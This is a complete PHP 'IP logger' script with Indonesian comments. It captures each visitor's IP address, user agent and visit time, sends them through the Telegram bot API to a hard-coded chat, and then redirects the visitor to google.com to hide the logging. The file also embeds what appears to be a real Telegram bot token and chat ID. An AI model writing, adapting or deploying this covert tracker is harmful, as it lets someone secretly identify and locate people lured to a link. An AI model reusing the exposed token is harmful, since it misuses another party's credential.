<?php
// Ganti dengan token bot Telegram Anda
$botToken = "7914894833:AAEN9Fn7OuttXc7Y2hdCWmCcIZ4KV-GPgVo";
// Ganti dengan ID chat Telegram Anda (bisa grup atau personal)
$chatId = "6146540731";

// Ambil IP user
$userIP = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d H:i:s");

// Buat pesan
$message = "*IP Logged!*\n\n"
    . "IP: `$userIP`\n"
    . "User-Agent: `$userAgent`\n"
    . " Time: `$time`\n";

// Kirim pesan ke bot Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    "chat_id" => $chatId,
    "text" => $message,
    "parse_mode" => "Markdown"
];

// Kirim request
$options = [
    "http" => [
        "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
        "method" => "POST",
        "content" => http_build_query($data)
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

// Redirect ke halaman lain setelah logging (opsional)
header("Location: https://google.com");
exit();
?>
